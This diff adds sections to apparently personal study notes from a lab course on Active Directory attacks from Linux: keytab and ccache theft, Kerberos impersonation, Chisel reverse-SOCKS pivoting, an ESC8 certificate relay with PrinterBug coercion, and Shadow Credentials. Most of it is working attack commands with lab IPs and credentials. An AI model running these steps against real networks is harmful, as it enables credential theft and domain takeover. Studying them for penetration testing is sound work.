@@ -242,3 +242,269 @@ From the new CMD that will open, we can do the `/ptt` to import the ticket into 
 Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
 ```
 
+# Pass the Ticket (PtT) from Linux
+
+```ad-note
+A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
+```
+
+## Kerberos on Linux
+
+Windows and Linux use the same process to request TGT and TGS. The way of storing them varies depending on the Linux distro. The default location to to store Kerberos tickets is in the `/tmp` directory.
+`KRB5CCNAME` this variable can identify if Kerberos tickets are being used or the default location for storing the tickets is changed. 
+
+A `keytab` is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). They can be used to authenticate to various systems without entering passwords. When password is changed, all `keytab` files must be recreated.
+
+```ad-note
+When a **keytab** file is created, it can be copied for use on other computers, they are not restricted to the hosts they were created on.
+```
+
+## Identifying Linux and Active Directory integration
+
+We can use the `realm` tool. A tool used to manage system enrollment in a domain and set which domain users and groups are allowed to access the local system resources.
+
+```sh
+realm list
+```
+
+![[realm list.png]]
+
+In case `realm` is not available, we can search for `sssd` or `winbind`:
+
+```sh
+ps -ef | grep -i "winbind\|sssd"
+```
+
+## Finding Kerberos tickets in Linux
+
+### Finding KeyTab files
+
+#### Using Find to search for files with keytab in the name
+
+```sh
+find / -name *keytab* -ls 2>/dev/null
+```
+
+```ad-important
+To use a keytab file, we must have read and write (rw) privileges on the file.
+```
+
+```ad-info
+We can use `kinit` to import a `keytab` into our session and act as the user.
+```
+
+```ad-note
+A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
+```
+
+## Finding ccache files
+
+A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts.
+One the user authenticates to the domain, a `ccache` file is created that stores the ticket information. Path to this file is stored in `KRB5CCNAME`
+
+#### Reviewing environment variables for ccache files.
+
+```sh
+env | grep -i krb5
+```
+
+## Abusing KeyTab files
+
+First thing we can do is impersonating users using `kinit` tool. We can use `klist` to read information about the `keytab` file.
+#### Listing KeyTab file information
+
+```sh
+klist -k -t /opt/specialfiles/carlos.keytab
+```
+
+![[keylist carlos keytab.png]]
+
+```ad-important
+`kinit` is **case sensitive**, so make sure to use the principal name exactly from the output of `klist`
+```
+#### Impersonating a user with a KeyTab
+
+```sh
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+```
+
+Now we can access `\\DC01\carlos` as an example to confirm our access.
+#### Connecting to SMB Share as Carlos
+
+```sh
+smbclient //dc01/carlos -k -c ls
+```
+
+### KeyTab Extract
+
+This is the second method. We will abuse Kerberos on Linux by extracting the secrets from the `keytab` file. Because if we want to access the user (`carlos` in our case) on the Linux machine, we'll need his password.
+
+We can extract the password hash from the file using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos, and attempt to crack it.
+#### Extracting KeyTab hashes with KeyTabExtract
+
+![[KeyTabExtract.png]]
+
+With the NTLM hash we can perform **Pass the Hash** attack. With the AES-256 and AES-128 we can forge tickets using `Rubeus` or attempt to crack the hashes to obtain clear-text password.
+
+```ad-note
+`keytab` file can contain different type of hashes and can be merged to contain multiple credentials for different users
+```
+
+## Abusing KeyTab ccache
+
+To abuse a `ccache` file, all we need is read privileges on the file.
+To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.
+
+```ad-note
+klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
+```
+
+## Using Linux attack tools with Kerberos
+
+*Scenario:* If our attack host isn't domain joined, and we can't use Domain Controller for name resolution, we have to proxy our traffic via a domain joined host.
+
+In this scenario we're going to use `Chisel` & `Proxychains` to proxy our traffic via `MS01`.
+
+First add the hosts resolutions to the attacker machine `/etc/hosts` file.
+Edit the `/etc/proxychains.conf` to use SOCKS5 and port 1080
+
+Run `chisel` on the attacker machine:
+
+```sh
+sudo ./chisel server --reverse
+```
+
+Execute `Chisel` on `MS01`
+
+```sh
+c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+```
+
+**Note:** the client IP is our attacker host IP.
+### Impacket
+
+To use Kerberos ticket, we need to:
+- Specify our target machine **name** (Not the IP)
+- Use the option `-k`
+- If we got a password prompt, we can use the option `-no-pass`
+#### Using Impacket with proxychains and Kerberos authentication
+
+```sh
+proxychains impacket-wmiexec dc01 -k
+```
+
+### Evil-WinRM
+
+To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication (`krb5-user`).
+
+We will get the following prompts
+
+![[krb5-user config.png]]
+
+Then we can check the config for Kerberos:
+
+```sh
+cat /etc/krb5.conf
+```
+
+Now we can use `evil-winrm`
+
+```sh
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+## Miscellaneous
+
+If we want to use a `ccache` file in Windows, or a `kirbi` file in Linux. We can use `impacket-ticketConverter` to convert them. 
+
+```sh
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+
+## Linikatz
+
+[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a password attacking tool for Linux. Like `Mimikatz` for Windows.
+
+## Assessment
+
+```ad-tldr
+Remember that you can simply extract NTLM or AES hashes from keytab files and utilize these hashes for authentication or crack the hash and use the clear-text password for authentication.
+
+---
+
+The credentials for Linux machine account are in the `/etc/krb5.keytab` file. Import this file using `kinit` and use it for Privilege Escalation
+```
+
+# Pass the Certificate
+
+[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`.  An extension of Kerberos protocol, allows initial authentication with the use of public key cryptography. It is used to support users logins using **Smart Cards**, which store private keys.
+
+**Pass the Certificate** is a technique utilizing X.509 Certificates to obtain `TGTs`. This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.
+## AD CS NTLM Relay Attack (ESC8)
+
+`ESC8` is an NTLM Relay Attack targeting ADCS HTTP Endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP.
+
+![[ESC8.png]]
+
+We can use `impacket-ntlmrelayx` to listen for inbound connections and relay them to the web enrollment service:
+
+```sh
+impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+```ad-note
+The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).
+```
+
+We can wait for users to actively try to attempt authentication against their machine randomly or force them using coerce them into doing so.
+
+**Example Exploitation of Printer Bug:**
+
+```sh
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+```
+
+![[ntlmerelayx output.png]]We can now perform **Pass the Ticket** attack to obtain a TGT as `DC01$`.
+
+We can use [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
+
+```sh
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+```
+
+Once we obtain the TGT, we can go back to `Pass the Ticket` attack to authenticate to target. As a domain controller machine account, we can perform attacks such as `DCSync`.
+## Shadow Credentials (msDS-KeyCredentialLink)
+
+[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
+
+![[Shadow Credentials BloodHound.png]]
+
+We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform the attack from Linux. The command will generate `X.509 Certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute.
+
+```sh
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+```
+
+![[pywhisker output.png]]
+
+We can use `gettgtpkinit.py` on the `.pfx` file from `pywhisker` to get a valid TGT as the victim.
+
+```sh
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+```
+
+After getting the TGT, we can go back to **Pass the Ticket** attack to authenticate as the victim user.
+
+```ad-info
+## No PKINIT?
+
+In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).
+```
+
+```ad-bug
+We will face the following error when using `PKINIT` tools:
+`"Error detecting the version of libcrypto"` We will fix the error by installing the `oscrypto` module:
+
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+```
+
